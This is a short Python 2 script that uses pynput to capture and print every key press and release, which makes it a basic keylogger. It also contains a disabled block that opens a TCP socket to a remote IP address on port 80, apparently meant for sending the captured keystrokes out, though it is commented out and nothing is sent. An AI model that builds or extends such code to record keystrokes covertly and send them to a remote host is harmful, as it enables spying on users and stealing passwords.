#!/usr/bin/env python

import socket
from pynput import keyboard

'''

TCP_IP = '192.162.1.10'
TCP_PORT = 80
BUFFER_SIZE = 1024
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
'''

def on_press(key):
    print key

			
			
def on_release(key):
	print key

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()